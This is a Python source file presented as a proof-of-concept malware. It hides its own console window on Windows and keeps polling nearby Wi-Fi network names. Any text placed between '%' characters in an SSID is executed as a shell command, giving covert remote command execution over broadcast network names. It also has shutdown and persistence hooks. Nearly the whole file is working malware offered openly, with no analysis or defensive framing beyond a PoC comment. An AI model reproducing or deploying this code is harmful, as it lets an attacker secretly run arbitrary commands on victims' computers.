#   This program is free software: you can redistribute it and/or modify
#   it under the terms of the GNU General Public License as published by
#   the Free Software Foundation, either version 3 of the License, or
#   (at your option) any later version.

#   This program is distributed in the hope that it will be useful,
#   but WITHOUT ANY WARRANTY; without even the implied warranty of
#   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#   GNU General Public License for more details.

#   You should have received a copy of the GNU General Public License
#   along with this program.  If not, see http://www.gnu.org/licenses/.


import os           #Shell Comands
import platform      #MultiOS Support Without Code changes
import time         #Sleep Function
import subprocess   #Pipe Output

OS = platform.system()

if "win" in OS or "windows" in OS:
    import win32api
    import win32console   #WinApi for console hiding (as a real malware!)
    import win32gui       #Windows Only
else:
    pass


#NOTE: Python version (this) is only a proof of concept (PoC), so it does not
#      include any advanced features that a malware should do.





def main():
    ocultarse()
    launch = getSSIDs()



def ocultarse():
    # We are hiding the console (Windows Only)
    win=win32console.GetConsoleWindow()
    win32gui.ShowWindow(win,0)



#Code Explain:
#We analize the result (the 'list' of SSIDs) searching for our
#specific SSID, one that starts and ends with '%' character
#code into % and % will be executed

def getSSIDs():
    found = ""
    Comando = ""

    while 1:
        data = Exec("netsh wlan show networks") #get every SSID (This Should be done with Win Api libraries.. if possible)
        print("Analizing SSIDS..")  #print(data)
        print()
        for letra in data:
            letra = chr(letra)  #fix Exec´s char variables
            if found == 'Y':    #If flag is true, parse and launch comand
                print("Launching Comand")
                if letra != '%':
                    Comando = Comando + letra  
                else:
                    print("Running Comand "+Comando)
                    r = Launch(Comando)
            else:
                pass
            
            if letra == '%':   #We´ve just found a malicious SSID
                print("Comand Found")
                found = 'Y'    #Set flag to true
            else:
                pass

            
        print("Esperando x5")    
        time.sleep(5)
        
    return r
     #for end#


def Launch(Comando):#Custom Function for OS comand exec
    if "win" in OS or "windows" in OS:
        if Comando == "perst":
            persistencia()
        elif Comando == "shutd":
            Exec("shutdown /p")
        elif Comando == "reveal":
            win=win32console.GetConsoleWindow()
            win32gui.ShowWindow(win,0)
            os.system("cls") #Windows Only :p
            print("Malware Revealed")
        else:
            Exec(Comando)
    elif "Linux" in OS:
        if Comando == "limp":
            Exec("clear") #Unique Linux Comand (example)
        else:
            Exec(Comando)


def Exec(cmde):
    # check if command exists
    if cmde:
        try:
            execproc = subprocess.Popen(cmde, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            cmdoutput = execproc.stdout.read() + execproc.stderr.read()
        except:
            pass
        return cmdoutput


main()



